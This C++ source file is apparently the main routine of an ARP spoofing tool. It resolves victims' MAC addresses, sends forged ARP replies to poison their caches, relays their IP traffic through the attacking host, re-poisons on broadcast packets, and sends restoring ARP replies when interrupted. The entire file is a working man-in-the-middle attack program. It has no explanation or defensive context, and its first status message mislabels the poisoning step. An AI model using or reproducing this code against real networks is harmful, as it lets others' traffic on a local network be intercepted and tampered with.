#include "arp_spoofing.h"

int main(int argc, char* argv[])
{
    if( argc < 4 || (argc % 2) )
    {
        usage();
        return -1;
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Open modules
    /////////////////////////////////////////////////////////////////////////////

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Make address table such (sender mac, sender ip, target mac, target ip)
    /////////////////////////////////////////////////////////////////////////////

    const int session_size = (argc - 2) / 2;
    addr_pair* address_table = (addr_pair*)calloc(session_size, sizeof(addr_pair));

    for(int i = 0; i < session_size; i++)
    {
        uint8_t sender_mac[MAC_SIZE] = {0, }, target_mac[MAC_SIZE] = {0, };

        get_mac_from_ip(sender_mac, argv[2*(i+1)]);
        get_mac_from_ip(target_mac, argv[2*(i+1)+1]);

        memcpy(address_table[i].sdr_mac, sender_mac, MAC_SIZE);
        address_table[i].sdr_ip = inet_addr(argv[2*(i+1)]);
        memcpy(address_table[i].tgt_mac, target_mac, MAC_SIZE);
        address_table[i].tgt_ip = inet_addr(argv[2*(i+1)+1]);
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Make all infection packets and restored packets
    /////////////////////////////////////////////////////////////////////////////

    arp_packet* infected_arp_list = (arp_packet*)calloc(session_size, sizeof(arp_packet));
    arp_packet* restored_arp_list = (arp_packet*)calloc(session_size, sizeof(arp_packet));

    uint8_t my_mac[MAC_SIZE] = {0, };   get_svr_mac_address(my_mac);
    uint32_t my_ip = 0;                 get_svr_ip_address(&my_ip);

    for(int i = 0; i < session_size; i++)
    {
        {
            memcpy(infected_arp_list[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
            memcpy(infected_arp_list[i].e.ether_shost, my_mac, MAC_SIZE);
            infected_arp_list[i].e.ether_type = htons(ETHERTYPE_ARP);

            infected_arp_list[i].a.ar_hrd = htons(ARPHRD_ETHER);
            infected_arp_list[i].a.ar_pro = htons(ETHERTYPE_IP);
            infected_arp_list[i].a.ar_hln = MAC_SIZE;
            infected_arp_list[i].a.ar_pln = IP_SIZE;
            infected_arp_list[i].a.ar_op  = htons(ARPOP_REPLY);

            memcpy(infected_arp_list[i].p.sdr_mac, my_mac, MAC_SIZE);
            infected_arp_list[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
            memcpy(infected_arp_list[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
            infected_arp_list[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
        }
        {
            memcpy(restored_arp_list[i].e.ether_dhost, address_table[i].sdr_mac, MAC_SIZE);
            memcpy(restored_arp_list[i].e.ether_shost, address_table[i].tgt_mac, MAC_SIZE);
            restored_arp_list[i].e.ether_type = htons(ETHERTYPE_ARP);

            restored_arp_list[i].a.ar_hrd = htons(ARPHRD_ETHER);
            restored_arp_list[i].a.ar_pro = htons(ETHERTYPE_IP);
            restored_arp_list[i].a.ar_hln = MAC_SIZE;
            restored_arp_list[i].a.ar_pln = IP_SIZE;
            restored_arp_list[i].a.ar_op  = htons(ARPOP_REPLY);

            memcpy(restored_arp_list[i].p.sdr_mac, address_table[i].tgt_mac, MAC_SIZE);
            restored_arp_list[i].p.sdr_ip = inet_addr(argv[2*(i+1)+1]);
            memcpy(restored_arp_list[i].p.tgt_mac, address_table[i].sdr_mac, MAC_SIZE);
            restored_arp_list[i].p.tgt_ip = inet_addr(argv[2*(i+1)]);
        }
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Print all table members
    /////////////////////////////////////////////////////////////////////////////

    printf("Session size: %d\n\n", session_size);

    for(int i = 0; i < session_size; i++)
    {
        printf("%dth address table\n", i+1);
        Print((const uint8_t*)&address_table[i], sizeof(addr_pair));
    }

    for(int i = 0; i < session_size; i++)
    {
        printf("%dth infected arp packet\n", i + 1);
        Print((const uint8_t*)&infected_arp_list[i], sizeof(arp_packet));
    }

    for(int i = 0; i < session_size; i++)
    {
        printf("%dth restored arp packet\n", i + 1);
        Print((const uint8_t*)&restored_arp_list[i], sizeof(arp_packet));
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Send all infected packets 3 times
    /////////////////////////////////////////////////////////////////////////////

    printf("Sending restored packets...\n\n");

    for(int count = 0; count < 3; count++)
    {
        for(int i = 0; i < session_size; i++)
        {
            if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_list[i], sizeof(arp_packet)) )
            {
                printf("infected arp packet sending failed\n");
                return -1;
            }
        }
        sleep(1);   // make some terms before send packets
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Relay packets
    /////////////////////////////////////////////////////////////////////////////

    sigset_t sigset, pendingset;

    sigfillset(&sigset);
    sigprocmask(SIG_BLOCK, &sigset, nullptr);

    while(true)
    {
        // loop until sigint interrupt(ctrl+c) occured
        if (sigpending(&pendingset) == 0 && sigismember(&pendingset, SIGINT)) break;

        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        if( is_broadcasting_packet(packet) )
        {
            printf("broadcasting packet captured\n");

            for(int i = 0; i < session_size; i++)
            {
                if( pcap_sendpacket(handle, (const uint8_t*)&infected_arp_list[i], sizeof(arp_packet)) )
                {
                    printf("infected arp packet sending failed\n");
                    return -1;
                }
            }
        }
        else if( is_ip_packet(packet) )
        {
            send_relay_packet(handle, packet, address_table, session_size, header->caplen);
        }
    }   


    /////////////////////////////////////////////////////////////////////////////
    /// Send all restored packets 3 times
    /////////////////////////////////////////////////////////////////////////////

    printf("Sending restored packets...\n\n");

    for(int count = 0; count < 3; count++)
    {
        for(int i = 0; i < session_size; i++)
        {
            if( pcap_sendpacket(handle, (const uint8_t*)&restored_arp_list[i], sizeof(arp_packet)) ) {
                printf("restored arp packet sending failed\n");
                return -1;
            }
        }
        sleep(1);   // make some terms before send packets
    }


    /////////////////////////////////////////////////////////////////////////////
    /// Close and return
    /////////////////////////////////////////////////////////////////////////////

    free(address_table);
    free(infected_arp_list);
    free(restored_arp_list);
    return 0;
}
